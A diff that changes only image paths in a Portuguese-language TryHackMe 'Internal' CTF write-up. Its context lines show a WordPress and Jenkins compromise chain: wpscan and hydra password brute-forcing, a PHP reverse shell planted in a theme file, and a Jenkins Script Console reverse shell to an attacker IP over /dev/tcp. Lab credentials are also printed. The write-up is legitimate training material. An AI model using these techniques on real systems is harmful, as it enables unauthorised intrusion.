@@ -4,11 +4,11 @@ author: Hastur
 date: 2021-09-07 23:00:00 -0300
 categories: [Writeups, Try Hack Me]
 tags: [THM, Windows, Hard, Web, WordPress, Jenkins, JS, PHP]
-image: /thm/thm-internal-logo.png
+image: /img/thm/thm-internal-logo.png
 alt: "THM Internal Writeup"
 ---
 
-<img src="/thm/thm-internal-logo.png">
+<img src="/img/thm/thm-internal-logo.png">
 
 <br>
 
@@ -26,7 +26,7 @@ Na descrição do projeto, temos as instruções para adicionar `internal.thm` a
 
 ### Nmap
 ```bash
-┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
+┌──(hastur㉿hastur)-[~/…/estudos/img/thm/hard/Internal]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.219.160 --min-rate=512
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -46,12 +46,12 @@ O nmap nos trouxe somente as portas 80 e 22, vamos começar pela porta 80.
 
 ### Porta 80
 
-<img src="/thm/thm-internal-1.png">
+<img src="/img/thm/thm-internal-1.png">
 
 A porta 80 nos trouxe a página padrão do `Apache`, vamos fazer uma varredura com gobuster para tentar enumerar algum diretório.
 
 ```bash
-┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
+┌──(hastur㉿hastur)-[~/…/estudos/img/thm/hard/Internal]
 └─$ gobuster dir -e -u http://internal.thm/ -w /usr/share/wordlists/dirb/common.txt -r
 ===============================================================
 Gobuster v3.1.0
@@ -85,12 +85,12 @@ http://internal.thm/server-status        (Status: 403) [Size: 277]
 
 A verredura nos trouxe dois diretórios interessantes, o `/blog` e o `phpmyadmin`, vamos ver o que está em `http://internal.thm/blog`.
 
-<img src="/thm/thm-internal-2.png">
+<img src="/img/thm/thm-internal-2.png">
 
 Nos deparamos com um blog em `WordPress`, porém não temos credenciais para editá-lo, vamos varrer o blog com o `wpscan`, para tentar enumerar alguma informação ou vulnerabilidade.
 
 ```bash
-┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
+┌──(hastur㉿hastur)-[~/…/estudos/img/thm/hard/Internal]
 └─$ wpscan --url http://internal.thm/blog/ -e vt,vp,u
 _______________________________________________________________
          __          _______   _____
@@ -199,7 +199,7 @@ Interesting Finding(s):
 Encontramos o usuário `admin`, podemos fazer um bruteforce com o próprio wpscan, para tentarmos encontrar uma senha válida.
 
 ```bash
-┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
+┌──(hastur㉿hastur)-[~/…/estudos/img/thm/hard/Internal]
 └─$ wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt 
 [+] Performing password attack on Xmlrpc against 1 user/s
 [SUCCESS] - admin / my2boys                                                                                          
@@ -211,13 +211,13 @@ Trying admin / bratz1 Time: 00:07:57 <                                      > (3
 
 Encontramos as credenciais `admin:my2boys`, vamos tentar o login.
 
-<img src="/thm/thm-internal-3.png">
+<img src="/img/thm/thm-internal-3.png">
 
 Conseguimos o login!!!
 
 Ao enumerar os posts do blog, encontramos um post sem título com uma tarefa `To-Do`, neste post, encontramos a credencial `william:arnold147`.
 
-<img src="/thm/thm-internal-6.png">
+<img src="/img/thm/thm-internal-6.png">
 
 Como o WordPress funciona sobre o PHP, vamos tentar editar alguma página de um tema para adicionarmos um payload.
 
@@ -405,18 +405,18 @@ unset($sh);
 echo '</pre>';
 
 ```
-<img src="/thm/thm-internal-4.png">
+<img src="/img/thm/thm-internal-4.png">
 
 Ao clicar em `Update File`, salvamos nossas alterações. Agora setamos um `netcat` na porta 8443 do nosso payload e fazemos um curl para a página alvo.
 O wordpress salva suas páginas no endereço `/wp-content/themes/<nome do tema>/404.php`.
 
 ```bash
-┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
+┌──(hastur㉿hastur)-[~/…/estudos/img/thm/hard/Internal]
 └─$ curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 ```
 E conseguimos nosso shell!!!
 
-<img src="/thm/thm-internal-5.png">
+<img src="/img/thm/thm-internal-5.png">
 
 No diretório `/var/www/html/wordpress`, encontramos o arquivo `wp-config.php` que contém as credenciais para o banco de dados.
 
@@ -441,7 +441,7 @@ aubreanna:bubb13guM!@#123
 ```
 Quando enumeramos o diretório `/home`, encontramos o usuário `aubreanna`, isso significa que a credencial encontrada, pode ser de acesso SSH, vamos testar.
 
-<img src="/thm/thm-internal-7.png">
+<img src="/img/thm/thm-internal-7.png">
 
 E conseguimos um acesso válido via SSH!!!
 
@@ -492,12 +492,12 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 Podemos redirecionar esta porta, para nossa própria porta 8080 via SSH.
 
 ```bash
-┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
+┌──(hastur㉿hastur)-[~/…/estudos/img/thm/hard/Internal]
 └─$ ssh -L 8080:localhost:8080 aubreanna@internal.thm 
 ```
 Agora podemos acessar via browser.
 
-<img src="/thm/thm-internal-8.png">
+<img src="/img/thm/thm-internal-8.png">
 
 Encontramos a tela de login do Jenkins!!!
 
@@ -505,12 +505,12 @@ Porém, nenhuma das credenciais que encontramos foi aceita, podemos fazer um bru
 
 Primeiro precisamos verificar os parâmetros de login e senha e a mensagem de erro quando o login falha, podemos pressionar `F12` no Firefox e verificar os nomes de campos e actions.
 
-<img src="/thm/thm-internal-9.png">
+<img src="/img/thm/thm-internal-9.png">
 
 Vamos iniciar o bruteforce com o usuário `admin`, que foi onde conseguimos o primeiro acesso.
 
 ```bash
-┌──(hastur㉿hastur)-[~/…/estudos/thm/hard/Internal]
+┌──(hastur㉿hastur)-[~/…/estudos/img/thm/hard/Internal]
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -526,7 +526,7 @@ Encontramos a credencial `admin:spongebob`!!!
 
 Ao efetuarmos o login na plataforma, podemos navegar até a opção `Script Console`, esta feature permite rodarmos javascript diretamente na plataforma, o que é perfeito, pois podemos tentar um reverse shell via JS.
 
-<img src="/thm/thm-internal-10.png">
+<img src="/img/thm/thm-internal-10.png">
 
 ```js
 r = Runtime.getRuntime()
@@ -534,11 +534,11 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.9.0.25/8444;cat <&5 | while re
 p.waitFor()
 ```
 
-<img src="/thm/thm-internal-11.png">
+<img src="/img/thm/thm-internal-11.png">
 
 Ao rodar o script, conseguimos nosso reverse shell.
 
-<img src="/thm/thm-internal-12.png">
+<img src="/img/thm/thm-internal-12.png">
 
 Após um tempo de enumeração local, encontrei novamente uma mensagem no diretório `/opt`.
 
